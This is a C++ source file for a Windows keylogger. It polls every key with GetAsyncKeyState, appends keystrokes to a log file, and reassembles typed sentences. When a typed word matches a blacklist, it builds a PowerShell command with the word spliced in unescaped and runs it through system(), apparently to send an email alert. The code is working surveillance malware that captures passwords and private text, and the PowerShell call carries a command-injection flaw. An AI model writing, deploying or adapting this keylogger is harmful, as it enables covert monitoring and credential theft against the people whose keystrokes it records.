#include "extern.hpp"

void SendEmail(std::string word)
{
    std::string alertString = "powershell -c \"$badword = '";
    alertString += word;
    alertString += "'; ";
    alertString += emailCmd;
    alertString += gen_random(12);
    alertString += ".bmp\"";

    // std::cout << alertString.c_str() << std::endl;
    system(alertString.c_str());
}

// Convert string to lowercase
std::string toLower(const std::string& str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(),
        [](unsigned char c) { return std::tolower(c); });
    return result;
}

// Check if a vector contains a specific string
bool vectorContainsString(const std::vector<std::string>& vec, const std::string& str) {
    std::unordered_set<std::string> set(vec.begin(), vec.end());
    std::cout << "Checking List Against :: " << str << std::endl;
    return set.find(str) != set.end();
}

// Parse and process each line of input
void ParseLine(std::string& line) {
    std::vector<std::string> words;
    size_t lastPos = 0;
    size_t pos = line.find(" ", lastPos);
    while (pos != std::string::npos) {
        words.push_back(line.substr(lastPos, pos - lastPos));
        lastPos = pos + 1;  // Move past the space to the next word
        pos = line.find(" ", lastPos);
    }

    if (lastPos < line.length()) {
        words.push_back(line.substr(lastPos));
    }

    for (size_t i = 0; i < words.size(); ++i) {
        if (vectorContainsString(blacklistWords, toLower(words[i]))) {
            std::cout << words[i] << " HAS BEEN FLAGGED!" << std::endl;
            SendEmail(words[i]);
        }
    }
}

// Function to get the character representation of a key
char GetCharFromKey(int key, bool shift) {
    if (key >= 'A' && key <= 'Z') {
        return shift ? key : key + 32; // Convert to lowercase if shift is not pressed
    }

    if (key >= '0' && key <= '9') {
        if (shift) {
            switch (key) {
            case '1': return '!';
            case '2': return '@';
            case '3': return '#';
            case '4': return '$';
            case '5': return '%';
            case '6': return '^';
            case '7': return '&';
            case '8': return '*';
            case '9': return '(';
            case '0': return ')';
            }
        }
        return key;
    }

    if (shift) {
        switch (key) {
        case VK_OEM_1: return ':';
        case VK_OEM_PLUS: return '+';
        case VK_OEM_COMMA: return '<';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PERIOD: return '>';
        case VK_OEM_2: return '?';
        case VK_OEM_3: return '~';
        case VK_OEM_4: return '{';
        case VK_OEM_5: return '|';
        case VK_OEM_6: return '}';
        case VK_OEM_7: return '"';
        }
    }
    else {
        switch (key) {
        case VK_OEM_1: return ';';
        case VK_OEM_PLUS: return '=';
        case VK_OEM_COMMA: return ',';
        case VK_OEM_MINUS: return '-';
        case VK_OEM_PERIOD: return '.';
        case VK_OEM_2: return '/';
        case VK_OEM_3: return '`';
        case VK_OEM_4: return '[';
        case VK_OEM_5: return '\\';
        case VK_OEM_6: return ']';
        case VK_OEM_7: return '\'';
        }
    }

    // Handle non-printable characters and avoid logging them
    if (key < 32 || key > 126) {
        return '\0'; // Non-printable character
    }

    return static_cast<char>(key);
}

void GetKey() {
    // std::cout << "[*] Init GetKey" << std::endl;

    // Loop through possible key codes
    for (int key = 8; key <= 255; key++) {

        // std::cout << "[*] -- " <<  GetAsyncKeyState(key) << std::endl;

        if (GetAsyncKeyState(key) == -32767) {
            std::cout << "[*] Attempting to Log Key" << std::endl;

            // Check if shift is pressed
            bool state = GetAsyncKeyState(VK_SHIFT) & 0x8000;

            if (testing)
            {
                std::cout << GetCharFromKey(key, state);
            }
            else
            {
                switch (key) {
                case VK_LEFT: outfile.open(logfile, std::ios::app); outfile << " [LEFT] "; break;
                case VK_UP: outfile.open(logfile, std::ios::app); outfile << " [UP] "; break;
                case VK_RIGHT: outfile.open(logfile, std::ios::app); outfile << " [RIGHT] "; break;
                case VK_DOWN: outfile.open(logfile, std::ios::app); outfile << " [DOWN] "; break;
                case VK_SHIFT: outfile.open(logfile, std::ios::app); break;
                case VK_CONTROL: outfile.open(logfile, std::ios::app); break;
                case VK_MENU: outfile.open(logfile, std::ios::app); break;
                case VK_ESCAPE: outfile.open(logfile, std::ios::app); outfile << " [ESC] "; break;
                case VK_RETURN:
                    outfile.open(logfile, std::ios::app);
                    outfile << "\n";
                    ParseLine(CurrentSentence);
                    CurrentSentence = "";
                    break;
                case VK_BACK:
                    outfile.open(logfile, std::ios::app);
                    outfile << " [BACKSPACE] ";
                    if (!CurrentSentence.empty()) {
                        CurrentSentence.pop_back();
                    }
                    break;
                case VK_TAB: outfile.open(logfile, std::ios::app); outfile << "    "; CurrentSentence += "    "; break;
                case VK_SPACE: outfile.open(logfile, std::ios::app); outfile << " "; CurrentSentence += " "; break;
                default:
                    outfile.open(logfile, std::ios::app);
                    char ch = GetCharFromKey(key, state);

                    std::cout << ch;

                    outfile << ch;

                    if (ch != ' ') // remove rouge spaces from getting enterer
                    {
                        if (ch != '.')
                            CurrentSentence += ch;
                        else
                            CurrentSentence += ' ';
                    }

                    break;
                }

                // Close file to save data
                outfile.close();
            }
        }
    }
}

// Function to run the keylogger
void runKeyLogger() {

    std::cout << "[*] runKeyLogger Start" << std::endl;

    if (!testing)
    {
        outfile.open(logfile, std::ios::app);
        if (!outfile.is_open()) {
            std::cerr << "Error opening file." << std::endl;
            return;
        }
    }

    while (true) {
        GetKey();
        Sleep(10); // Help reduce CPU Usage
    }

    outfile.close();

    std::cout << "[*] runKeyLogger End" << std::endl;
}

// Main function
int main() {
    runKeyLogger();
    return 0;
}